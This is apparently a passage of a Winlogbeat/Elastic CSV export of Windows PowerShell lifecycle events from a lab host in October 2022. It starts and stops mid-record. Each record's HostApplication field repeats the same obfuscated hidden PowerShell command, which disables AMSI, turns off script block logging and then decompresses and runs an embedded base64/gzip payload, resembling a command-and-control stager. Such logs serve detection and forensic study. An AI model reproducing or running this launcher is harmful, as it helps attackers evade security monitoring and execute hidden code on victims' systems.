qw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6172,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.107","_3kLBIQByII7dpeEYg2R",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6171,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.714","_nkLBIQByII7dpeEYg2R",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3c